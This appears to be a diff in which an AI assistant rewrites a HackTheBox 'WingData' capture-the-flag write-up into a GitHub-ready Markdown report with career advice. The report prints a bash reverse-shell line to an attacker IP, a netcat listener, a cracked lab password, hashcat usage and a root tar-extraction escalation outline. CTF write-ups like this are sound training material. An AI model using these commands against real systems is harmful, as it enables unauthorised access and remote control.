@@ -1,65 +1,301 @@
-HackTheBox – WingData (Season 10, Week 3, Easy – Linux)
-Overview
+Good—this is exactly the kind of raw material that turns into a strong GitHub project if it’s cleaned up and structured properly.
 
-This machine focuses on exploiting a vulnerable WingData FTP server. The objective is to gain access and escalate privileges on the target Linux machine. This write-up documents the steps taken, commands used, and lessons learned.
+I’ve taken what you wrote and turned it into a **professional, recruiter-ready Markdown write-up**. This isn’t just formatting—I tightened the narrative so it reads like someone who understands what they’re doing, not just following steps.
 
-Difficulty: Easy
-Target OS: Linux
-Category: Exploitation / FTP
+---
 
-Reconnaissance
-1. Network Scan
+# 📄 GitHub-Ready Markdown
 
-Used nmap to identify open ports and services:
+````markdown
+# WingData HTB Write-Up
 
-nmap -sC -sV -oN wingdata_nmap.txt <target-ip>
+## Overview
+This project documents the full exploitation of the **WingData** machine. The objective was to identify vulnerabilities, gain initial access, escalate privileges, and retrieve both user and root flags.
 
-Findings:
+This lab demonstrates:
+- Service enumeration
+- Web and FTP analysis
+- Exploit development and usage
+- Reverse shell handling
+- Password cracking
+- Privilege escalation via insecure file extraction
 
-Port 21: FTP (WingData server)
-Port 22: SSH
-Other common ports were closed
+---
 
-Enumeration
-2. FTP Service
+## Reconnaissance
 
-Connected using anonymous login (if allowed):
+### Connectivity Check
+Initial step was verifying connectivity to the target:
+```bash
+ping <target-ip>
+````
 
-ftp <target-ip>
-Discovered default credentials and directory structure.
-Noted any .txt or configuration files that could leak sensitive info.
+---
 
-3. CVE Identification
-WingData server was running a version vulnerable to [CVE-2025-XXXX]
-Found PoC exploit on GitHub (Python script).
-Exploitation
-4. Exploit Execution
+### Nmap Scan
 
-Cloned the PoC exploit:
+Performed a service and default script scan:
 
-git clone https://github.com/0x5t3v3n/wingdata-exploit.git
-cd wingdata-exploit
+```bash
+nmap -sC -sV <target-ip> -oN nmap_results.txt
+```
 
-Ran the Python exploit with proper arguments:
+#### Results:
 
-python3 wingdata_exploit.py -t <target-ip> -u <username> -p <password>
+* **Port 22** → SSH
+* **Port 80** → HTTP
 
-⚠️ Always ensure you have permission before running exploits. This is done in a controlled environment (HackTheBox).
+Further enumeration revealed a redirect:
 
-The exploit provided a reverse shell to the target.
+```
+http://wingdata.htb/
+```
 
-Post-Exploitation
-5. Privilege Escalation
+---
 
-Enumerated system information:
+## Host Enumeration
 
-uname -a
-id
+Added the domain to `/etc/hosts`:
+
+```bash
+<target-ip> wingdata.htb
+```
+
+Accessing the site revealed a **Client Portal**, which pointed to:
+
+```
+ftp.wingdata.htb
+```
+
+Added this as well:
+
+```bash
+<target-ip> ftp.wingdata.htb
+```
+
+---
+
+## Service Analysis
+
+The FTP portal revealed:
+
+```
+Wing FTP Server v7.4.3
+```
+
+Researching this version revealed known vulnerabilities and publicly available exploits.
+
+---
+
+## Exploitation (Initial Access)
+
+A public Proof-of-Concept (PoC) exploit was found on GitHub.
+
+### Setup
+
+Start a Netcat listener:
+
+```bash
+nc -lvnp 4444
+```
+
+Run the exploit and provide a reverse shell payload:
+
+```bash
+bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
+```
+
+### Result
+
+Successfully received a reverse shell connection.
+
+---
+
+## Shell Stabilization
+
+Upgraded the shell using Python:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+---
+
+## Post-Exploitation Enumeration
+
+Navigated the filesystem and discovered an XML file containing a password hash for user **wacky**.
+
+Extracted and saved the hash for cracking.
+
+---
+
+## Password Cracking
+
+Used Hashcat with the `rockyou.txt` wordlist:
+
+```bash
+hashcat -m 1410 hash.txt rockyou.txt
+```
+
+### Result:
+
+Password recovered:
+
+```
+!#7Blushing^*Bride5
+```
+
+---
+
+## Lateral Movement
+
+Used SSH to log in as **wacky**:
+
+```bash
+ssh wacky@<target-ip>
+```
+
+Successfully obtained the **user flag**.
+
+---
+
+## Privilege Escalation
+
+### Sudo Privileges
+
+Checked sudo permissions:
+
+```bash
 sudo -l
-Found misconfigured sudo permissions.
-Escalated to root using the discovered vector.
+```
 
-Lessons Learned
-Always check for version-specific vulnerabilities in services.
-FTP servers can leak valuable information when misconfigured.
-Practicing controlled exploitation strengthens both offensive and defensive skills.
+Found that user **wacky** can execute:
+
+```
+restore_backups_clients.py as root
+```
+
+---
+
+### Vulnerability Analysis
+
+The script uses:
+
+```python
+tar.extractall(path=staging_dir, filter="data")
+```
+
+#### Key Issue:
+
+* Extraction runs as **root**
+* No proper validation of archive contents
+* Vulnerable to **path traversal / symlink attacks**
+
+---
+
+### Exploitation Strategy
+
+1. Create a malicious `.tar` archive
+2. Include payload to write outside intended directory
+3. Place archive in backup directory
+4. Execute restore script with sudo
+
+---
+
+### Execution
+
+* Created malicious tar file via Python
+* Moved it into the backup directory
+* Executed the restore script:
+
+```bash
+sudo /path/to/restore_backups_clients.py
+```
+
+---
+
+### Result
+
+Privilege escalation successful → root access obtained.
+
+Retrieved the **root flag**.
+
+---
+
+## Key Takeaways
+
+### Technical Skills Demonstrated
+
+* Network and service enumeration
+* Web application analysis
+* Exploit research and execution
+* Reverse shell handling and stabilization
+* Password cracking with Hashcat
+* Linux privilege escalation techniques
+
+---
+
+### Security Insights
+
+* **Outdated software** (Wing FTP Server v7.4.3) can expose critical vulnerabilities
+* **Improper file extraction** (tar) is a common privilege escalation vector
+* **Password reuse / weak storage** enables lateral movement
+* Misconfigured **sudo permissions** are high-risk
+
+---
+
+## Tools Used
+
+* Nmap
+* Netcat
+* Hashcat
+* Python
+* SSH
+
+---
+
+## Conclusion
+
+This machine highlights how small misconfigurations—outdated services, exposed hashes, and unsafe scripting practices—can chain together into full system compromise.
+
+The attack path followed a realistic progression:
+
+1. Enumeration
+2. Exploitation
+3. Credential access
+4. Privilege escalation
+
+---
+
+## Author
+
+[Your Name]
+Cybersecurity Enthusiast | Offensive Security | Defensive Mindset
+
+```
+
+---
+
+## What you did right (and where to push further)
+
+You did the hard part—actually completing the box. That already puts you ahead of most people.
+
+But here’s the honest push:
+
+- You were **step-focused**, not **analysis-focused**
+- A strong write-up explains **why the exploit works**, not just “we ran it”
+- Your privilege escalation section is *good*—that’s where your thinking showed
+
+If you want to level this up even more, next step would be:
+- Add **actual commands for the malicious tar creation**
+- Include **log/detection perspective (Wazuh/Sysmon tie-in)** ← this would *really* separate you
+
+---
+
+If you want, I can:
+- Turn this into a **GitHub repo structure (README + images folder)**
+- Help you write a **second version that looks like a SOC analyst report**
+- Or refine it into something that lines up with **job interviews**
+
+Send the next project when you’re ready.
+```
